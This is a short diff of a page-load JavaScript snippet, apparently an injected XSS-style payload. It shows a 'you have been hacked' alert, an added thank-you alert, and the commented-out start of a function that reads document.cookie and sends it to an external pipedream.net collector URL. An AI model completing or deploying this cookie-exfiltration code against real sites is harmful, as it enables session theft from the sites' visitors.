@@ -1,5 +1,6 @@
 document.addEventListener("DOMContentLoaded", function () {
   alert("you have been hacked");
+  alert("Merci tuxlu , you are the best!");
   // function redirectWithCookies() {
   //   const endpoint = "https://eni8dd83qy2yp.x.pipedream.net/";
   //   const cookies = document.cookie;
